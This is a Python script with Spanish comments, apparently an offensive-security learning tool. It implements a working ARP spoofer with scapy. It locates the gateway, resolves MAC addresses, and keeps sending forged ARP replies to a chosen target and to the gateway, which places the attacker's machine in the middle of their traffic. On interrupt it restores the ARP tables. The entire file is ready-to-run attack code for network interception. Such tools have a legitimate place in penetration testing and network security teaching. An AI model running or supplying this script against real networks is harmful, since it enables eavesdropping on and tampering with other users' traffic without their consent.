#!/usr/bin/env python3

import argparse
import time
import scapy.all as scapy
import signal
from termcolor import colored
import subprocess
import os

# Almacenamiento global para la IP del Gateway, necesaria para la restauración
gateway_ip = None
target_ip = None
target_mac = None
gateway_mac = None
iface = None
local_mac = None # <-- NUEVA VARIABLE GLOBAL

def get_local_mac(iface):
    try:
        # Usa la función nativa de Scapy para obtener la MAC del dispositivo en la interfaz
        local_mac = scapy.get_if_hwaddr(iface)
        return local_mac
    except Exception as e:
        print(colored(f"[-] Error al obtener la MAC local de {iface}. Verifica la interfaz.", 'red'))
        return None

def get_mac(ip, iface):
    arp_request = scapy.ARP(pdst=ip)
    ether_frame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = ether_frame / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False, iface=iface)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def get_gateway():
    try:
        output = subprocess.run(["route", "-n"], capture_output=True, text=True, check=True).stdout
        for linea in output.splitlines():
            partes = linea.split()
            if len(partes) > 1 and partes[0] == "0.0.0.0":
                return partes[1]
    except subprocess.CalledProcessError:
        print(colored("[-] Error: No se pudo ejecutar 'route -n'.", 'red'))
    except IndexError:
        print(colored("[-] Error: No se pudo parsear el Gateway.", 'red'))
    return None

def restore_arp(dst_ip, src_ip, dst_mac, src_mac, iface):
    # Usa la MAC de origen real del dispositivo
    arp_pack = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    ether_pack = scapy.Ether(dst=dst_mac, src=src_mac)
    scapy.sendp(ether_pack / arp_pack, count=7, verbose=False, iface=iface)

def senial(sig, fram):
    print(colored("\n[!] Señal de interrupción recibida. Restaurando tablas ARP...", "yellow"))
    
    if target_ip and gateway_ip and target_mac and gateway_mac and iface:
        restore_arp(target_ip, gateway_ip, target_mac, gateway_mac, iface)
        restore_arp(gateway_ip, target_ip, gateway_mac, target_mac, iface)
        print(colored("[+] Tablas ARP restauradas exitosamente.", "green"))
    else:
        print(colored("[-] No se pudo restaurar: Faltan datos críticos.", "red"))
        
    os._exit(1)

signal.signal(signal.SIGINT, senial)

def get_arguments():
    arg = argparse.ArgumentParser(description="ARP Spoofer Automático")
    arg.add_argument("-t", "--target", required=True, dest="ipAddr", help="IP del objetivo.")
    arg.add_argument("-i", "--interface", required=True, dest="iface", help="Interfaz de red (ej: eth0, wlan0).")
    return arg.parse_args()

def spoof(ip, spoof_ip, target_mac, iface, local_mac): # <-- NUEVO ARGUMENTO
    # Uso de la MAC local del dispositivo en hwsrc
    arp_pack = scapy.ARP(
        op=2, 
        psrc=spoof_ip, 
        pdst=ip, 
        hwsrc=local_mac # <-- MAC REAL DEL ATACANTE
    ) 
    
    # Uso de la MAC local del dispositivo en Ether(src)
    ether_pack = scapy.Ether(
        dst=target_mac, 
        src=local_mac # <-- MAC REAL DEL ATACANTE
    )

    scapy.sendp(ether_pack / arp_pack, verbose=False, iface=iface)

def main():
    global gateway_ip, target_ip, target_mac, gateway_mac, iface, local_mac
    
    args = get_arguments()
    target_ip = args.ipAddr
    iface = args.iface

    # 1. OBTENER MAC LOCAL
    local_mac = get_local_mac(iface)
    if not local_mac:
        os._exit(1)
        
    gateway_ip = get_gateway()
    if not gateway_ip:
        print(colored("[-] No se pudo obtener la IP del Gateway. Saliendo.", 'red'))
        os._exit(1)

    print(colored(f"[+] Buscando MACs en {iface}...", 'cyan'))
    target_mac = get_mac(target_ip, iface)
    gateway_mac = get_mac(gateway_ip, iface)
    
    if not target_mac or not gateway_mac:
        print(colored("[-] No se pudo obtener la MAC del objetivo o del gateway. Saliendo.", 'red'))
        os._exit(1)

    print(colored(f"[+] MAC Local: {local_mac}", 'cyan'))
    print(colored(f"[+] Gateway: {gateway_ip} ({gateway_mac}) | Objetivo: {target_ip} ({target_mac})", 'green'))
    print(colored("[!] Iniciando ARP Spoofing. Presiona Ctrl+C para restaurar y salir.", 'yellow'))
    
    try:
        while True:
            # Pasa la MAC local a la función spoof
            spoof(target_ip, gateway_ip, target_mac, iface, local_mac) 
            # Pasa la MAC local a la función spoof
            spoof(gateway_ip, target_ip, gateway_mac, iface, local_mac) 
            time.sleep(0.5)
            
    except Exception as e:
        print(colored(f"\n[-] Error en el bucle principal: {e}", 'red'))
        senial(None, None) 
        
if __name__ == '__main__':
    main()
